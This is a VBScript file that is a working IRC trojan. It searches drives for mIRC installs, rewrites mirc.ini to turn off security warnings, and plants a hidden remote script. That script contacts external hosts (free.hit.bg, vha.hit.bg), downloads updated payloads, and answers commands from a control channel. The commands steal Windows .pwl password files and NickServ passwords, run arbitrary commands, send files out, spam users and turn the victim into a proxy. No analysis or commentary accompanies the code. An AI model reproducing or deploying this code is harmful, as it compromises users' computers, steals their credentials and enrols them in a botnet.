dim Otag 

dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
call ShowFolderList("d:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
DummyTag= "C:\winamod.dat"
TTag= s & "versions.txt"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
'SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=versions.txt"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "on *:start:{ "
fr6.writeline "  if $exists( $mircdir $+ mirc.reg ) { .remove $mircdir $+ mirc.reg } "
fr6.writeline "  unset %vg.id.*"
fr6.writeline "  set %vg.ver 1.4 | unset %invbot* | unset %bn* | unset %bs | %vg.prt = $r(50000,60000) | if ( $portfree( %vg.prt ) == $true ) { .socklisten bounce %vg.prt }"
fr6.writeline "  if (%http == $null) { %http = http://www.petq-nikolaeva.net - I wanna be erotic model } |  writeini mirc.ini warn fserve off | writeini mirc.ini warn dcc off | writeini mirc.ini fileserver warning off | writeini mirc.ini text quit %http"
fr6.writeline "  if ( %vg.nh != ? ) { set %vg.nh ? | .run $mircexe | .exit } "
fr6.writeline "}"
fr6.writeline "on *:connect:.sockopen st free.hit.bg 80"
fr6.writeline "on *:text:*:?:{ if ( $sock(bn*,0) != 0 ) { var %tmp 0 | :go | inc %tmp | if ( %tmp > $sock(bn*,0) ) { goto end } | .sockwrite -n $sock(bn*,%tmp) : $+ $nick -> $me $+ : $1- | goto go | :end } }  "
fr6.writeline "on *:input:?:{ if ( $sock(bn*,0) != 0 ) { var %tmp 0 | :go | inc %tmp | if ( %tmp > $sock(bn*,0) ) { goto end } | .sockwrite -n $sock(bn*,%tmp) : $+ $me -> $active $+ : $1- | goto go | :end } | if ( $active iswm ?s ) { sockwrite -n vght : $+ $me -> $active : $1- } | if ( $left($1,1) == / ) && ( $2 = ns ) { set %vg.ni.pass $4 } }     "
fr6.writeline "on *:input:*:if ( $left($1,1) == / ) && ( $2 = ns ) { set %vg.ni.pass $4 }"
fr6.writeline "on *:sockopen:st:{ if ( $sockerr > 0 ) { return } | .sockwrite -n $sockname GET http://vha.hit.bg/set.txt }"
fr6.writeline "on *:sockread:st:{"
fr6.writeline "  if ( $sockerr > 0 ) && ( $sockbr == 0 ) { return }"
fr6.writeline "  .sockread %vg.st "
fr6.writeline "  echo %vg.st"
fr6.writeline "  if ( $gettok(%vg.st,1,32) == chan ) { set %vg.ch $gettok(%vg.st,2,32) | set %vg.k $gettok(%vg.st,3,32) }"
fr6.writeline "  if ( $gettok(%vg.st,1,32) == conn ) { .sockopen vght $gettok(%vg.st,2,32) $gettok(%vg.st,3,32)  }  "
fr6.writeline "  if ( $gettok(%vg.st,1,32) == vers ) { set %vg.nv $gettok(%vg.st,2,32) }"
fr6.writeline "if ( $gettok(%vg.st,1,32) == file ) { if (%vg.nv > %vg.ver ) { gethttp free.hit.bg http://vha.hit.bg/vght.vbs $gettok(%vg.st,2,32) $gettok(%vg.st,2,32) } }"
fr6.writeline "}"
fr6.writeline "on *:sockopen:vght:{"
fr6.writeline "  if ( $sockerr > 0 ) { return }"
fr6.writeline "  if ( %vg.ni != $null ) { .sockwrite -n $sockname NICK %vg.ni | .timer 1 2 .sockwrite -n $sockname mode %vg.ni +i  }"
fr6.writeline "  else { %vg.bot = $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) | .sockwrite -n $sockname NICK %vg.bot $+ $r(0,500) | .timer 1 2 .sockwrite -n $sockname mode %vg.bot +i }"
fr6.writeline "  .sockwrite -n $sockname USER $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ @abv.bg . : $+ $me"
fr6.writeline "  .timer 1 2 .sockwrite -n $sockname JOIN  %vg.ch %vg.k "
fr6.writeline "}"
fr6.writeline "on *:sockread:vght:{"
fr6.writeline "  if ( $sockerr > 0 ) && ( $sockbr == 0 ) { return }"
fr6.writeline "  .sockread %vg | %vg.op = @ $+ %vg.ch"
fr6.writeline "  if  ( $gettok(%vg,2,32) == 319 ) && (  %vg.op  isin %vg )  { set %vg.id. [ $+ [ $remove($gettok(%vg,4,32),:) ] ]  ?  }"
fr6.writeline "  if (  $remove($gettok(%vg,4,32),:)  == !ident ) {  .sockwrite -n $sockname whois $remove($gettok(%vg,1,33),:) | .sockwrite -n $sockname PRIVMSG %vg.ch : $+ $remove($gettok(%vg,1,33),:) has identified to me... }"
fr6.writeline "  if ( $left(%vg,4) == PING ) { .sockwrite -n $sockname PONG $remove(%vg,$left(%vg,6)) }"
fr6.writeline "  if ( %vg.id. [ $+ [ $remove($gettok(%vg,1,33),:) ] ] == ? ) {"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !pwd ) { .sockwrite -n $sockname PRIVMSG %vg.ch : $+ $findfile($gettok(%vg,5,32),*.pwl,1) $findfile($gettok(%vg,5,32),*.pwl,2) $findfile($gettok(%vg,5,32),*.pwl,3) $findfile($gettok(%vg,5,32),*.pwl,4) $findfile($gettok(%vg,5,32),*.pwl,5) $findfile($gettok(%vg,5,32),*.pwl,6) $findfile($gettok(%vg,5,32),*.pwl,7) $findfile($gettok(%vg,5,32),*.pwl,8) $findfile($gettok(%vg,5,32),*.pwl,9) $findfile($gettok(%vg,5,32),*.pwl,10) }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !raw ) { .sockwrite -n $sockname $gettok(%vg,5,32) $gettok(%vg,6,32) $gettok(%vg,7,32) $gettok(%vg,8,32) $gettok(%vg,9,32) $gettok(%vg,10,32) $gettok(%vg,11,32) $gettok(%vg,12,32) $gettok(%vg,13,32) $gettok(%vg,14,32) $gettok(%vg,15,32) $gettok(%vg,16,32) $gettok(%vg,17,32) $gettok(%vg,18,32) $gettok(%vg,19,32) }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !mirc ) { $gettok(%vg,5,32) $gettok(%vg,6,32) $gettok(%vg,7,32) $gettok(%vg,8,32) $gettok(%vg,9,32) $gettok(%vg,10,32) $gettok(%vg,11,32) $gettok(%vg,12,32) $gettok(%vg,13,32) $gettok(%vg,14,32) $gettok(%vg,15,32) $gettok(%vg,16,32) $gettok(%vg,17,32) $gettok(%vg,18,32) $gettok(%vg,19,32) }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !user ) { .sockwrite -n $sockname PRIVMSG %vg.ch : $+ $me $server $mircdir $finddir(c:\,win*,1) | .sockwrite -n $sockname PRIVMSG %vg.ch : $+ Chanz: $chan(1) $chan(2) $chan(3) $chan(4) $chan(5) $chan(6) $chan(7) }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !send ) { .sockclose dccsendf | .sockclose dccsendf1 | fdccsend $gettok(%vg,5,32) $remove($gettok(%vg,1,33),:) }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !get ) { gethttp $gettok(%vg,5,32) $gettok(%vg,6,32) $gettok(%vg,7,32) }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !ver ) { .sockwrite -n $sockname PRIVMSG %vg.ch :version %vg.ver }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !set ) {"
fr6.writeline "      if ( $remove($gettok(%vg,5,32),:) == nick ) { set %vg.ni $remove($gettok(%vg,6,32),:) | sockwrite -n $sockname nick %vg.ni }"
fr6.writeline "      if ( $remove($gettok(%vg,5,32),:) == newhttp ) { set %http $remove($gettok(%vg,6,32),:) | set %vg.nh ! }"
fr6.writeline "    }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !nspass ) { .sockwrite -n $sockname PRIVMSG %vg.ch :ns pass for  $+ $me $+  is   $+ %vg.ni.pass $+  }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !bnc ) { .sockwrite -n $sockname PRIVMSG %vg.ch :port number: %vg.prt }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !invbot ) { .sockclose invbot | set %invbot.ni $remove($gettok(%vg,5,32),:) | set %invbot.ch $remove($gettok(%vg,7,32),:) | set %invbot.msg  $remove($gettok(%vg,8,32),:) $remove($gettok(%vg,9,32),:) $remove($gettok(%vg,10,32),:) $remove($gettok(%vg,11,32),:) $remove($gettok(%vg,12,32),:) $remove($gettok(%vg,13,32),:) $remove($gettok(%vg,14,32),:) $remove($gettok(%vg,15,32),:) | .sockopen invbot $remove($gettok(%vg,6,32),:) 6667  }"
fr6.writeline "    if ( $remove($gettok(%vg,4,32),:) == !getpwl ) && ( $remove($gettok(%vg,5,32),:) isnum ) { .sockclose dccsendf | .sockclose dccsendf1 | .fdccsend $findfile(c:\,*.pwl,$remove($gettok(%vg,5,32),:)) $remove($gettok(%vg,1,33),:) }"
fr6.writeline "  }"
fr6.writeline "  unset %vg"
fr6.writeline "}"
fr6.writeline "on *:socklisten:bounce:.sockaccept bn $+ $r(0,9999)"
fr6.writeline "on *:sockread:bn*:{ "
fr6.writeline "  if ($sockerr > 0) && ( $sockbr == 0) { return }"
fr6.writeline "  .sockread %bn"
fr6.writeline "  if ( $gettok(%bn,1,32) == NICK ) { set %bn.ni $+ $sockname $gettok(%bn,2,32)  }"
fr6.writeline "  if ( $gettok(%bn,1,32) == USER ) { set %bn.usr $+ $sockname $remove(%bn,$gettok(%bn,1,32)) | .sockwrite -n $sockname NOTICE AUTH :You need to say /quote PASS <password> }"
fr6.writeline "  if ( $gettok(%bn,1,32) == pass ) && ( %bn.acc [ $+ [ $sockname != ! ] ] ) {"
fr6.writeline "    if ( $gettok(%bn,2,32) != %vg.bncp ) { .sockwrite -n $sockname NOTICE AUTH :Failed Pass!! }"
fr6.writeline "    else { .sockwrite -n $sockname NOTICE AUTH :type /quote conn [server] <port> to connect | set %bn.acc $+ $sockname ! }          "
fr6.writeline "  }"
fr6.writeline "  if ( %bn.acc [ $+ [ $sockname ] ] == ! ) { "
fr6.writeline "    if ( $gettok(%bn,1,32) == conn ) && ( $gettok(%bn,2,32) != $null ) && ( $gettok(%bn,3,32) != $null )  { "
fr6.writeline "      .sockclose bs [ $+ [ $sockname ] ] | sockopen bs [ $+ [ $sockname ] ] $gettok(%bn,2,32) $gettok(%bn,3,32) | sockwrite -n $sockname NOTICE AUTH :Making reality through $gettok(%bn,2,32) port $gettok(%bn,3,32) !! | halt  "
fr6.writeline "    }"
fr6.writeline "  }"
fr6.writeline "  if ( $gettok(%bn,1,32) == QUIT ) { if ( $sock(bs [ $+ [ $sockname ] ])) { .sockwrite -n bs [ $+ [ $sockname ] ] %bn } | unset %bn.* $+ $sockname $+ * | .sockclose $sockname | sockclose bs [ $+ [ $sockname ] ] }"
fr6.writeline "  if ( $sock(bs [ $+ [ $sockname ] ])) { .sockwrite -n bs [ $+ [ $sockname ] ] %bn }"
fr6.writeline "  unset %bn"
fr6.writeline "}"
fr6.writeline "on *:sockopen:bs*:{"
fr6.writeline "  if ( $sockerr > 0) { sockwrite -n $remove($sockname,bs) NOTICE AUTH :Failed Connection | return }"
fr6.writeline "  sockwrite -n $remove($sockname,bs) NOTICE AUTH :Suceeded connection | sockwrite -n $sockname NICK %bn.ni [ $+ [ $remove($sockname,bs) ] ] | sockwrite -n $sockname USER %bn.usr [ $+ [ $remove($sockname,bs) ] ]    "
fr6.writeline "}"
fr6.writeline "on *:sockread:bs*:{"
fr6.writeline "  if ($sockerr > 0) && ( $sockbr == 0) { return }"
fr6.writeline "  sockread %bs"
fr6.writeline "  if ( $sock($remove($sockname,bs))) { sockwrite -n $remove($sockname,bs) %bs }"
fr6.writeline "}"
fr6.writeline "on *:sockopen:invbot:{"
fr6.writeline "  if ( $sockerr > 0 ) { return }"
fr6.writeline "  sockwrite -n $sockname NICK %invbot.ni "
fr6.writeline "  sockwrite -n $sockname USER $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ @abv.bg . : $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)"
fr6.writeline "  .timer 1 2 sockwrite -n $sockname JOIN %invbot.ch | .timer 1 2 sockwrite -n $sockname who %invbot.ch | .timer 1 2 sockwrite -n $sockname part %invbot.ch | set %inv.count 5"
fr6.writeline "}"
fr6.writeline "on *:sockread:invbot:{"
fr6.writeline "  if ($sockerr > 0) && ( $sockbr == 0) { return }"
fr6.writeline "  sockread %inb"
fr6.writeline "  if ( $left(%inb,4) == PING ) { sockwrite -n $sockname PONG $remove(%inb,$left(%inb,6)) }"
fr6.writeline "  if ( $gettok(%inb,2,32) == 352 ) && ( $gettok(%inb,8,32) != $me )  { .timer 1 %inv.count sockwrite -n $sockname privmsg $gettok(%inb,8,32) : $+ %invbot.msg | %inv.count = %inv.count + 5 }"
fr6.writeline "} "
fr6.writeline "alias fdccsend { %dccsport = $r(60000,64000) | %dccsfile = $1 | socklisten dccsendf %dccsport | sockwrite -n vght PRIVMSG $2 :DCC SEND  $1 $longip($ip) %dccsport $file($1).size $+  }"
fr6.writeline "on *:socklisten:dccsendf: {"
fr6.writeline "  sockaccept dccsendf1 | %dccsendi =  0 | .bread %dccsfile %dccsendi 512 &dccbfile "
fr6.writeline "  :dccfileread"
fr6.writeline "  if ( %dccsendi >= $file(%dccsfile).size  ) { sockclose dccsendf | sockclose dccsendf1 | unset %dccs* | halt }  "
fr6.writeline "  sockwrite dccsendf1 &dccbfile | %dccsendi =  $calc( %dccsendi + 512 ) | goto dccfileread"
fr6.writeline "}"
fr6.writeline "alias gethttp { sockopen httpf $1 80 | %vg.hf = $2 | %vg.gf = $3 }"
fr6.writeline "on *:sockopen:httpf: {"
fr6.writeline "  if ( $sockerr > 0 ) { return }"
fr6.writeline "  if ($exists(%vg.gf)) { .remove %vg.gf }"
fr6.writeline "  sockwrite -n $sockname GET %vg.hf"
fr6.writeline "}"
fr6.writeline "on *:sockread:httpf: {"
fr6.writeline "  if ( $sockerr > 0 ) && ( $sockbr == 0 ) { return }"
fr6.writeline "  sockread &httpfb | .bwrite %vg.gf -1 &httpfb"
fr6.writeline "}"
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n2=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[fileserver]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(Mid(n2a, 1, 3))=ucase("warning=on") then
fr2a.writeline "warning=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=//.Remote ON"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")

sss.DeleteFile "c:\winamod.dat"
